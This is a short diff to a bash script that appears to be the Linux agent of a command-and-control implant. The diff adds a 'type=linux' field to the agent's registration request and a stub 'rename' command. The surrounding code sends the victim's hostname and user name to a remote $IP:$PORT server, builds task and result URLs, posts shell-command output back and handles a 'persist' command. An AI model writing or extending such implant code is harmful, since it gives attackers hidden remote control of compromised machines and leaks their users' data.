@@ -6,7 +6,7 @@ name=""
 hname=$(hostname)
 uname=$(whoami)
 regurl="http://$IP:$PORT/reg"
-name=$(curl -X POST --data "hname=$hname&uname=$uname" -H "Content-Type: application/x-www-form-urlencoded" $regurl)
+name=$(curl -X POST --data "hname=$hname&uname=$uname&type=linux" -H "Content-Type: application/x-www-form-urlencoded" $regurl)
 
 resulturl="http://$IP:$PORT/results/$name"
 taskurl="http://$IP:$PORT/tasks/$name"
@@ -25,6 +25,11 @@ do
 
         if [ "$command" == "shell" ]; then
             curl -X POST --data "result=$data" -H "Content-Type: application/x-www-form-urlencoded" $resulturl
+        fi
+
+        if [ "$command" == "rename" ]; then
+            echo ""
+            # TODO: rename agent
         fi
 
         if [ "$command" == "persist" ]; then
